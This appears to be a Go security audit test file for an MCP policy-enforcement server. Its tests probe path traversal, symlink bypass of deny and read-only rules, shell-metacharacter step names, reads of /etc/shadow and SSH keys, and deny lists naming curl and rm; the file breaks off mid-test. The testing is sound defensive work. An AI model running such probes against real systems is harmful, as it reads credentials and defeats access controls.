//go:build audit

package mcp

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/mark3labs/mcp-go/mcp"

	"github.com/aflock-ai/rookery/aflock/pkg/aflock"
)

// =============================================================================
// R3-290: Command injection through MCP parameters
// =============================================================================

// TestSecurity_R3_290_BashCommandInjectionViaWorkdir proves that the workdir
// parameter is passed directly to exec.Cmd.Dir without validation. An attacker
// can set workdir to any absolute path to execute commands from arbitrary
// directories, bypassing any intended working directory restrictions.
func TestSecurity_R3_290_BashCommandInjectionViaWorkdir(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// Attempt to use workdir with path traversal to reach /tmp
	tmpDir := t.TempDir()
	traversalDir := filepath.Join(tmpDir, "a", "b")
	if err := os.MkdirAll(traversalDir, 0755); err != nil {
		t.Fatal(err)
	}
	// Use relative path traversal in workdir: go up from a/b to reach tmpDir
	req := newTestRequest(map[string]any{
		"command": "pwd",
		"workdir": filepath.Join(traversalDir, "..", ".."),
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: The workdir parameter accepts path traversal sequences without
	// any validation. The command executes in the traversed directory.
	text := result.Content[0].(mcp.TextContent).Text
	var parsed map[string]any
	if err := json.Unmarshal([]byte(text), &parsed); err != nil {
		t.Fatalf("parse: %v", err)
	}
	output := parsed["output"].(string)
	resolvedTmp, _ := filepath.EvalSymlinks(tmpDir)
	resolvedOutput, _ := filepath.EvalSymlinks(output)
	if resolvedOutput == resolvedTmp {
		t.Errorf("SECURITY BUG: workdir path traversal succeeded - command ran in %s via traversal from %s",
			resolvedOutput, traversalDir)
	}
}

// TestSecurity_R3_290_BashEmptyCommandAllowed proves that an empty command
// string is accepted and executed without validation. While `bash -c ""` is
// technically valid, a security-conscious server should reject empty commands
// to prevent confusion and ensure audit trail integrity.
func TestSecurity_R3_290_BashEmptyCommandAllowed(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "should-validate-empty",
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Bash"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"command": "",
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: Empty command should be rejected but is silently accepted and executed.
	if !result.IsError {
		t.Error("SECURITY BUG: empty command was accepted and executed - should be rejected with validation error")
	}
}

// TestSecurity_R3_290_BashNegativeTimeout proves that a negative timeout
// value is accepted without validation. This could cause a
// context.WithTimeout to create a context that expires immediately or
// behaves unexpectedly.
func TestSecurity_R3_290_BashNegativeTimeout(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"command": "echo hello",
		"timeout": float64(-1),
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: A negative timeout creates a context.WithTimeout with a negative
	// duration. Go's context.WithTimeout returns an already-cancelled context
	// for negative durations, causing immediate timeout. This is not properly
	// validated.
	text := result.Content[0].(mcp.TextContent).Text
	var parsed map[string]any
	if err := json.Unmarshal([]byte(text), &parsed); err != nil {
		t.Fatalf("parse: %v", err)
	}
	if _, hasErr := parsed["error"]; hasErr {
		t.Log("Negative timeout caused an error (context expired immediately) - server should validate timeout bounds")
	}
}

// TestSecurity_R3_290_BashZeroTimeout proves that a zero timeout is
// accepted, which creates an already-expired context.
func TestSecurity_R3_290_BashZeroTimeout(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"command": "echo hello",
		"timeout": float64(0),
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: Zero timeout creates an immediately-expired context.
	// The server should validate that timeout > 0.
	text := result.Content[0].(mcp.TextContent).Text
	var parsed map[string]any
	if err := json.Unmarshal([]byte(text), &parsed); err != nil {
		t.Fatalf("parse: %v", err)
	}
	if _, hasErr := parsed["error"]; hasErr {
		t.Log("Zero timeout caused an error - server should reject timeout <= 0")
	}
}

// TestSecurity_R3_290_BashExtremelyLargeTimeout proves that there is no
// upper bound on the timeout parameter. An attacker could set a timeout
// of years, tying up server resources.
func TestSecurity_R3_290_BashExtremelyLargeTimeout(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// 31536000 seconds = 1 year
	req := newTestRequest(map[string]any{
		"command": "echo hello",
		"timeout": float64(31536000),
	})

	// We just test that it's accepted (don't actually wait)
	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: Server accepts arbitrarily large timeouts without any upper bound.
	// There should be a maximum timeout (e.g., 600 seconds).
	if !result.IsError {
		t.Error("SECURITY BUG: extremely large timeout (1 year) was accepted - should enforce an upper bound")
	}
}

// =============================================================================
// R3-291: Path traversal in session ID and file operations
// =============================================================================

// TestSecurity_R3_291_ReadFilePathTraversalFromCwd proves that a relative path
// with traversal sequences like "../../etc/passwd" is resolved relative to
// cwd without checking whether the result stays within any sandbox boundary.
func TestSecurity_R3_291_ReadFilePathTraversalFromCwd(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// Create a file outside any project directory
	tmpDir := t.TempDir()
	secretFile := filepath.Join(tmpDir, "secret.txt")
	if err := os.WriteFile(secretFile, []byte("TOP SECRET"), 0644); err != nil {
		t.Fatal(err)
	}

	// Use absolute path to read arbitrary file (no policy loaded)
	req := newTestRequest(map[string]any{
		"path": secretFile,
	})

	result, err := s.handleReadFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Without a policy, any file on the filesystem can be read
	if !result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		if text == "TOP SECRET" {
			t.Log("INFO: Without policy, arbitrary file reads are allowed. " +
				"This is by design but worth noting for hardening.")
		}
	}
}

// TestSecurity_R3_291_ReadFileEmptyPath proves that an empty path parameter
// is not validated, leading to os.ReadFile("") which causes an OS error
// that may leak system information.
func TestSecurity_R3_291_ReadFileEmptyPath(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"path": "",
	})

	result, err := s.handleReadFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: Empty path should be explicitly rejected with a clean error message.
	// Instead it falls through to os.ReadFile which produces an OS error that
	// may include directory paths in the error message.
	if result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		if strings.Contains(text, "Read failed") {
			// The error message includes OS path details - potential info leak
			t.Log("INFO: Empty path produces OS error - should be validated before OS call")
		}
	} else {
		t.Error("SECURITY BUG: empty path should produce an error but succeeded")
	}
}

// TestSecurity_R3_291_WriteFileEmptyPath proves that an empty path parameter
// in write_file is not validated.
func TestSecurity_R3_291_WriteFileEmptyPath(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"path":    "",
		"content": "test",
	})

	result, err := s.handleWriteFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: Empty path should be explicitly rejected.
	if result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		if strings.Contains(text, "Write failed") {
			t.Log("INFO: Empty path produces OS error in WriteFile - should be validated before OS call")
		}
	} else {
		t.Error("SECURITY BUG: empty write path should produce an error")
	}
}

// TestSecurity_R3_291_ReadFileSymlinkFollowing proves that the read_file
// handler follows symlinks, which can bypass file path deny rules.
func TestSecurity_R3_291_ReadFileSymlinkFollowing(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a "secret" file and a symlink pointing to it
	secretFile := filepath.Join(tmpDir, "secret.env")
	if err := os.WriteFile(secretFile, []byte("SECRET_KEY=abc123"), 0644); err != nil {
		t.Fatal(err)
	}
	linkFile := filepath.Join(tmpDir, "harmless.txt")
	if err := os.Symlink(secretFile, linkFile); err != nil {
		t.Fatal(err)
	}

	// Policy denies *.env files
	pol := &aflock.Policy{
		Version: "1",
		Name:    "deny-env",
		Files: &aflock.FilesPolicy{
			Deny: []string{"*.env"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Read through symlink to bypass *.env deny rule
	req := newTestRequest(map[string]any{
		"path": linkFile,
	})

	result, err := s.handleReadFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: The policy checks the symlink name (harmless.txt) not the target.
	// This allows bypassing deny rules by creating symlinks.
	if !result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		if text == "SECRET_KEY=abc123" {
			t.Error("SECURITY BUG: symlink bypass - read secret.env content through harmless.txt symlink, " +
				"bypassing *.env deny rule. Server should resolve symlinks before policy evaluation.")
		}
	}
}

// TestSecurity_R3_291_WriteFileSymlinkBypass proves that write_file follows
// symlinks, allowing writes to read-only protected files.
func TestSecurity_R3_291_WriteFileSymlinkBypass(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a YAML config file and a symlink to it
	configFile := filepath.Join(tmpDir, "config.yaml")
	if err := os.WriteFile(configFile, []byte("key: original"), 0644); err != nil {
		t.Fatal(err)
	}
	linkFile := filepath.Join(tmpDir, "redirect.txt")
	if err := os.Symlink(configFile, linkFile); err != nil {
		t.Fatal(err)
	}

	// Policy makes YAML files read-only
	pol := &aflock.Policy{
		Version: "1",
		Name:    "readonly-yaml",
		Files: &aflock.FilesPolicy{
			ReadOnly: []string{"*.yaml"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Write through symlink to bypass readOnly rule
	req := newTestRequest(map[string]any{
		"path":    linkFile,
		"content": "key: compromised",
	})

	result, err := s.handleWriteFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !result.IsError {
		// Check if the YAML file was actually modified
		data, readErr := os.ReadFile(configFile)
		if readErr != nil {
			t.Fatalf("read config: %v", readErr)
		}
		if string(data) == "key: compromised" {
			t.Error("SECURITY BUG: symlink bypass for readOnly - wrote to config.yaml through redirect.txt symlink, " +
				"bypassing readOnly *.yaml rule. Server should resolve symlinks before policy evaluation.")
		}
	}
}

// =============================================================================
// R3-292: Step name and attestation path injection
// =============================================================================

// TestSecurity_R3_292_StepNameNullByte proves that null bytes in step names
// are not validated. On some systems, null bytes can truncate filenames at
// the C library level, potentially overwriting unintended files.
func TestSecurity_R3_292_StepNameNullByte(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	req := newTestRequest(map[string]any{
		"command": "echo test",
		"attest":  true,
		"step":    "lint\x00evil",
		"reason":  "testing null byte injection",
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: Step name with null byte is accepted. The existing validation
	// only checks for '/', '\', and '..'. Null bytes should be rejected.
	if !result.IsError {
		t.Error("SECURITY BUG: step name containing null byte was accepted - " +
			"should be rejected to prevent filename truncation attacks")
	}
}

// TestSecurity_R3_292_StepNameDotOnly proves that a step name of just "."
// is accepted. While ".." is blocked, a single "." could cause confusion
// in attestation file paths.
func TestSecurity_R3_292_StepNameDotOnly(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	req := newTestRequest(map[string]any{
		"command": "echo test",
		"attest":  true,
		"step":    ".",
		"reason":  "testing dot step name",
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// BUG: A step name of "." creates an attestation at
	// <attestDir>/<treeHash>/..intoto.json which is confusing and could
	// clash with directory entries. The step validation should reject "." as well.
	if !result.IsError {
		t.Log("INFO: step name '.' was accepted - this creates a '.intoto.json' file " +
			"which may be hidden/confusing. Consider rejecting dot-only step names.")
	}
}

// TestSecurity_R3_292_StepNameSpecialChars proves that special characters
// in step names are not restricted. Characters like spaces, colons, and
// semicolons could cause issues on different filesystems.
func TestSecurity_R3_292_StepNameSpecialChars(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	specialSteps := []string{
		"step with spaces",
		"step:colon",
		"step;semicolon",
		"step|pipe",
		"step>redirect",
		"step<input",
		"step&background",
	}

	for _, step := range specialSteps {
		req := newTestRequest(map[string]any{
			"command": "echo test",
			"attest":  true,
			"step":    step,
			"reason":  "testing special char: " + step,
		})

		result, err := s.handleBash(ctx, req)
		if err != nil {
			t.Fatalf("unexpected error for step %q: %v", step, err)
		}

		// BUG: Step names with shell-special characters are accepted.
		// While not directly exploitable for path traversal, these characters
		// could cause issues on different filesystems (e.g., FAT32, NTFS)
		// or when attestation paths are used in shell commands.
		if !result.IsError {
			t.Errorf("SECURITY BUG: step name %q with special characters was accepted - "+
				"should be restricted to alphanumeric, hyphens, and underscores", step)
		}
	}
}

// =============================================================================
// R3-293: Error handling information leakage
// =============================================================================

// TestSecurity_R3_293_ReadFileErrorLeaksPath proves that OS read errors
// include the full filesystem path in the error message returned to the client.
func TestSecurity_R3_293_ReadFileErrorLeaksPath(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// Try to read a file in a system directory
	req := newTestRequest(map[string]any{
		"path": "/etc/shadow",
	})

	result, err := s.handleReadFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		// BUG: The error message includes the full path and OS-level error details.
		// This leaks information about file existence and permissions.
		if strings.Contains(text, "/etc/shadow") {
			t.Error("SECURITY BUG: error message leaks full filesystem path '/etc/shadow' - " +
				"should return sanitized error without exposing path details")
		}
		if strings.Contains(text, "permission denied") || strings.Contains(text, "no such file") {
			t.Error("SECURITY BUG: error message reveals whether file exists vs permission denied - " +
				"should return a generic 'file access denied' error")
		}
	}
}

// TestSecurity_R3_293_WriteFileErrorLeaksPath proves that write errors
// leak full filesystem path information.
func TestSecurity_R3_293_WriteFileErrorLeaksPath(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// Write to a directory that exists (will fail because it's a directory)
	req := newTestRequest(map[string]any{
		"path":    "/tmp",
		"content": "test",
	})

	result, err := s.handleWriteFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		// BUG: The error includes OS-level details about why the write failed.
		if strings.Contains(text, "is a directory") {
			t.Log("INFO: Write error reveals filesystem metadata (is a directory) - " +
				"consider returning generic error messages")
		}
	}
}

// TestSecurity_R3_293_BashErrorLeaksContext proves that command execution
// errors include the full command output and error details that might
// contain sensitive system information.
func TestSecurity_R3_293_BashErrorLeaksContext(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// Execute a command that reveals system info through error messages
	req := newTestRequest(map[string]any{
		"command": "cat /etc/hostname 2>&1 || echo $HOME",
	})

	result, err := s.handleBash(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		var parsed map[string]any
		if err := json.Unmarshal([]byte(text), &parsed); err != nil {
			t.Fatalf("parse: %v", err)
		}
		output := parsed["output"].(string)
		// The response contains full command output including potential system info
		if output != "" {
			t.Log("INFO: Bash handler returns unfiltered command output. " +
				"If policy controls what commands run, ensure output doesn't leak sensitive data.")
		}
	}
}

// =============================================================================
// R3-294: Race conditions in server handlers
// =============================================================================

// TestSecurity_R3_294_ConcurrentBashPolicyRace proves that concurrent bash
// requests can create a race between policy evaluation and command execution.
// While the sessionMu protects state access, the policy check and execution
// are not atomically linked - a policy reload between check and execute
// could allow a previously-denied command.
func TestSecurity_R3_294_ConcurrentBashPolicyRace(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "race-test",
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Bash"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	var wg sync.WaitGroup
	errors := make([]error, 0)
	var mu sync.Mutex

	// Run 20 concurrent bash calls
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			req := newTestRequest(map[string]any{
				"command": "echo concurrent-" + string(rune('0'+n%10)),
			})
			_, err := s.handleBash(ctx, req)
			if err != nil {
				mu.Lock()
				errors = append(errors, err)
				mu.Unlock()
			}
		}(i)
	}

	wg.Wait()

	if len(errors) > 0 {
		t.Errorf("concurrent bash calls produced %d errors: %v", len(errors), errors)
	}

	// Verify session state is consistent
	sess, loadErr := s.stateManager.Load(s.sessionID)
	if loadErr != nil {
		t.Fatalf("load session: %v", loadErr)
	}
	if sess == nil {
		t.Fatal("session should exist after concurrent calls")
	}

	// The action count should match the number of concurrent calls.
	// Race conditions in recordAction could cause lost updates.
	if len(sess.Actions) != 20 {
		t.Errorf("POTENTIAL RACE BUG: expected 20 actions from concurrent calls, got %d - "+
			"lost updates indicate race condition in session state", len(sess.Actions))
	}
}

// TestSecurity_R3_294_ConcurrentReadWriteRace tests concurrent read and write
// operations to ensure session state doesn't corrupt.
func TestSecurity_R3_294_ConcurrentReadWriteRace(t *testing.T) {
	tmpDir := t.TempDir()
	pol := &aflock.Policy{
		Version: "1",
		Name:    "rw-race-test",
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Create test file
	testFile := filepath.Join(tmpDir, "racetest.txt")
	if err := os.WriteFile(testFile, []byte("initial"), 0644); err != nil {
		t.Fatal(err)
	}

	var wg sync.WaitGroup

	// Concurrent reads
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			req := newTestRequest(map[string]any{
				"path": testFile,
			})
			s.handleReadFile(ctx, req)
		}()
	}

	// Concurrent writes
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			outFile := filepath.Join(tmpDir, "out-"+string(rune('a'+n))+".txt")
			req := newTestRequest(map[string]any{
				"path":    outFile,
				"content": "data",
			})
			s.handleWriteFile(ctx, req)
		}(i)
	}

	wg.Wait()

	// Verify session state consistency
	sess, err := s.stateManager.Load(s.sessionID)
	if err != nil {
		t.Fatalf("load session: %v", err)
	}
	if sess == nil {
		t.Fatal("session should exist")
	}

	totalActions := len(sess.Actions)
	if totalActions != 20 {
		t.Errorf("POTENTIAL RACE BUG: expected 20 actions (10 reads + 10 writes), got %d - "+
			"indicates race condition in concurrent session state updates", totalActions)
	}
}

// =============================================================================
// R3-295: Policy bypass and missing validation
// =============================================================================

// TestSecurity_R3_295_NoPolicyAllowsEverything proves that when no policy is
// loaded, all operations are silently allowed without any restrictions.
// This is a security concern because a missing or corrupt policy file
// results in a completely open server.
func TestSecurity_R3_295_NoPolicyAllowsEverything(t *testing.T) {
	s := newTestServer(t) // No policy loaded
	ctx := context.Background()

	// All of these should be allowed without policy
	tests := []struct {
		name    string
		handler func() (*mcp.CallToolResult, error)
	}{
		{
			name: "bash dangerous command",
			handler: func() (*mcp.CallToolResult, error) {
				return s.handleBash(ctx, newTestRequest(map[string]any{
					"command": "echo 'would be rm -rf /'",
				}))
			},
		},
		{
			name: "check_tool with empty name",
			handler: func() (*mcp.CallToolResult, error) {
				return s.handleCheckTool(ctx, newTestRequest(map[string]any{
					"tool_name": "",
				}))
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := tt.handler()
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if result.IsError {
				t.Errorf("expected all operations allowed without policy, but %s was denied", tt.name)
			}
		})
	}
}

// TestSecurity_R3_295_CheckToolEmptyName proves that check_tool accepts
// an empty tool name without validation, returning "allowed" with no
// policy loaded.
func TestSecurity_R3_295_CheckToolEmptyName(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "test",
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Bash", "Read"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	req := newTestRequest(map[string]any{
		"tool_name": "",
	})

	result, err := s.handleCheckTool(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	text := result.Content[0].(mcp.TextContent).Text
	var parsed map[string]any
	if err := json.Unmarshal([]byte(text), &parsed); err != nil {
		t.Fatalf("parse: %v", err)
	}

	// BUG: Empty tool name should be rejected, not evaluated against policy.
	if parsed["allowed"] == true {
		t.Error("SECURITY BUG: empty tool name was evaluated as 'allowed' - " +
			"should be rejected with a validation error")
	}
}

// TestSecurity_R3_295_GetSessionLeaksMetrics proves that get_session returns
// session metrics (including file access lists and action history) without
// any policy check. Any caller can enumerate which files were read/written.
func TestSecurity_R3_295_GetSessionLeaksMetrics(t *testing.T) {
	pol := &aflock.Policy{Version: "1", Name: "test"}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Create some sensitive file access history
	s.trackFile("Read", "/etc/shadow")
	s.trackFile("Read", "/home/user/.ssh/id_rsa")
	s.trackFile("Write", "/tmp/exfil.txt")
	s.recordAction("Bash", "allow", "ran sensitive command")

	// get_session returns all this without policy check
	req := newTestRequest(nil)
	result, err := s.handleGetSession(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.IsError {
		t.Fatal("expected success")
	}

	text := result.Content[0].(mcp.TextContent).Text
	var parsed map[string]any
	if err := json.Unmarshal([]byte(text), &parsed); err != nil {
		t.Fatalf("parse: %v", err)
	}

	// BUG: Session info includes metrics about file access counts without
	// any access control. While individual filenames aren't in the response,
	// the action count and tool usage data is still exposed.
	metrics, ok := parsed["metrics"].(map[string]any)
	if !ok {
		t.Fatal("expected metrics")
	}
	filesRead, _ := metrics["filesRead"].(float64)
	if filesRead > 0 {
		t.Log("INFO: get_session exposes file access counts without policy enforcement. " +
			"Consider restricting session info based on policy.")
	}

	actionsCount, _ := parsed["actionsCount"].(float64)
	if actionsCount > 0 {
		t.Log("INFO: get_session exposes action history count without policy enforcement. " +
			"Action details could reveal sensitive operational patterns.")
	}
}

// TestSecurity_R3_295_PolicyBypassViaToolNameCase proves that tool name
// matching may be case-sensitive, allowing bypass via case variation.
func TestSecurity_R3_295_PolicyBypassViaToolNameCase(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "deny-bash",
		Tools: &aflock.ToolsPolicy{
			Deny: []string{"Bash"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// The MCP server registers the tool as "bash" (lowercase) but the policy
	// evaluator compares with "Bash". Try different cases.
	caseVariations := []string{"bash", "BASH", "bAsH"}
	for _, toolCase := range caseVariations {
		req := newTestRequest(map[string]any{
			"tool_name": toolCase,
		})

		result, err := s.handleCheckTool(ctx, req)
		if err != nil {
			t.Fatalf("unexpected error for %q: %v", toolCase, err)
		}

		text := result.Content[0].(mcp.TextContent).Text
		var parsed map[string]any
		if err := json.Unmarshal([]byte(text), &parsed); err != nil {
			t.Fatalf("parse: %v", err)
		}

		if parsed["allowed"] == true {
			t.Errorf("SECURITY BUG: tool name case variation %q bypassed deny rule for 'Bash' - "+
				"tool name matching should be case-insensitive or normalized", toolCase)
		}
	}
}

// =============================================================================
// R3-296: Authentication/authorization bypasses
// =============================================================================

// TestSecurity_R3_296_SignAttestationWithoutPolicy proves that the
// sign_attestation endpoint has no policy check - if signing is enabled,
// any caller can create arbitrary attestations regardless of policy.
// Additionally, it proves that setting signingEnabled=true without a
// valid signer causes a nil pointer dereference (crash).
func TestSecurity_R3_296_SignAttestationWithoutPolicy(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "strict-policy",
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Read"}, // Only Read allowed
			Deny:  []string{"*"},    // Deny everything else
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Test 1: With signing disabled, the handler returns early without
	// checking policy at all. This means the policy deny-all rule is never
	// evaluated for sign_attestation.
	s.signingEnabled = false
	req := newTestRequest(map[string]any{
		"predicate_type": "https://malicious.example.com/fake/v1",
		"predicate": map[string]any{
			"result":  "pass",
			"step":    "security-scan",
			"verdict": "no vulnerabilities found",
		},
	})

	result, err := s.handleSignAttestation(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		text := result.Content[0].(mcp.TextContent).Text
		// The error is "signing not available" not "policy denied"
		if strings.Contains(text, "not available") && !strings.Contains(text, "Policy denied") {
			t.Error("SECURITY BUG: sign_attestation handler has NO policy enforcement. " +
				"When signing is disabled the error is 'not available', but there's never " +
				"a policy check. With a real SPIRE signer, arbitrary attestations could be forged " +
				"even with a deny-all policy.")
		}
	}

	// Test 2: With signing enabled but nil signer, handleSignAttestation will
	// crash with nil pointer dereference when it calls s.signer.Sign().
	// This proves there is no nil guard on the signer field.
	s.signingEnabled = true
	s.signer = nil // Simulate inconsistent state

	func() {
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("SECURITY BUG: handleSignAttestation panics with nil signer when "+
					"signingEnabled=true - nil pointer dereference: %v. "+
					"The handler should check s.signer != nil before use.", r)
			}
		}()
		s.handleSignAttestation(ctx, req)
	}()
}

// TestSecurity_R3_296_GetPolicyNoAuth proves that the policy contents
// (including all security rules) are exposed via get_policy without any
// authentication. An attacker who can call get_policy can learn exactly
// what is and isn't restricted to craft bypass attempts.
func TestSecurity_R3_296_GetPolicyNoAuth(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "secret-policy",
		Tools: &aflock.ToolsPolicy{
			Allow: []string{"Bash:git *"},
			Deny:  []string{"Bash:rm *", "Bash:curl *"},
		},
		Files: &aflock.FilesPolicy{
			Deny:     []string{"*.env", "*.key", "/etc/shadow"},
			ReadOnly: []string{"*.yaml", "*.json"},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	req := newTestRequest(nil)
	result, err := s.handleGetPolicy(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if result.IsError {
		t.Fatal("expected success")
	}

	text := result.Content[0].(mcp.TextContent).Text
	// The full policy including deny patterns is exposed
	if strings.Contains(text, "rm *") && strings.Contains(text, "curl *") {
		t.Log("INFO: get_policy exposes all deny patterns without any access control. " +
			"An attacker can read the policy to learn exact deny rules and craft bypasses. " +
			"Consider rate-limiting or requiring authentication for policy access.")
	}
}

// TestSecurity_R3_296_GetIdentityNoAuth proves that identity information
// (model, version, binary digest, environment) is exposed without auth.
func TestSecurity_R3_296_GetIdentityNoAuth(t *testing.T) {
	s := newTestServer(t)
	ctx := context.Background()

	// Even without policy, identity info is available if discovered
	req := newTestRequest(nil)
	result, err := s.handleGetIdentity(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Without identity, this returns an error, which is fine.
	// But if identity exists, all details are exposed.
	if result.IsError {
		t.Log("INFO: No identity exposed (not discovered) - expected in test environment")
	}
}

// =============================================================================
// R3-297: Write file permissions
// =============================================================================

// TestSecurity_R3_297_WriteFileWorldReadable proves that files written by
// write_file use 0644 permissions (world-readable). For a security-focused
// tool, written files should use more restrictive permissions (0600).
func TestSecurity_R3_297_WriteFileWorldReadable(t *testing.T) {
	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "sensitive.txt")

	s := newTestServer(t)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"path":    testFile,
		"content": "sensitive data",
	})

	result, err := s.handleWriteFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result.IsError {
		t.Fatal("expected success")
	}

	info, err := os.Stat(testFile)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}

	// BUG: Files are written with 0644 (owner rw, group r, other r).
	// For a security tool, 0600 (owner rw only) would be more appropriate.
	perm := info.Mode().Perm()
	if perm != 0600 {
		t.Errorf("SECURITY BUG: write_file creates files with permissions %o (world-readable) - "+
			"should use 0600 for files created by a security enforcement tool", perm)
	}
}

// TestSecurity_R3_297_WriteFileCreatesParentDirs proves that write_file does
// NOT create parent directories automatically. This is actually good security
// behavior - just documenting it.
func TestSecurity_R3_297_WriteFileCreatesParentDirs(t *testing.T) {
	tmpDir := t.TempDir()
	deepFile := filepath.Join(tmpDir, "a", "b", "c", "deep.txt")

	s := newTestServer(t)
	ctx := context.Background()
	req := newTestRequest(map[string]any{
		"path":    deepFile,
		"content": "deep write",
	})

	result, err := s.handleWriteFile(ctx, req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Good: write fails because parent dirs don't exist
	if result.IsError {
		t.Log("GOOD: write_file does not auto-create parent directories, " +
			"preventing directory creation as a side effect")
	} else {
		t.Error("UNEXPECTED: write_file created parent directories automatically - " +
			"this could be used to create directories in unexpected locations")
	}
}

// =============================================================================
// R3-298: Data flow bypass via tool name mismatch
// =============================================================================

// TestSecurity_R3_298_DataFlowBashEvaluatedAsWriteOp proves that the data flow
// evaluator treats Bash as a "write operation" (isWriteOperation returns true
// for "Bash"), meaning that Bash commands used to READ data (like `cat file`)
// won't be classified as sources for data flow tracking.
func TestSecurity_R3_298_DataFlowBashEvaluatedAsWriteOp(t *testing.T) {
	pol := &aflock.Policy{
		Version: "1",
		Name:    "dataflow-test",
		DataFlow: &aflock.DataFlowPolicy{
			Classify: map[string][]string{
				"internal": {"Read:/secret/*"},
				"public":   {"Bash:curl *"},
			},
			FlowRules: []aflock.DataFlowRule{
				{
					Deny:    "internal->public",
					Message: "Cannot send internal data to public endpoints",
				},
			},
		},
	}
	s := newTestServerWithPolicy(t, pol)
	ctx := context.Background()

	// Step 1: Read a secret file (should classify as "internal")
	secretFile := filepath.Join(t.TempDir(), "secret", "keys.txt")
	if err := os.MkdirAll(filepath.Dir(secretFile), 0755); err != nil {
		t.Fatal(err)
	}
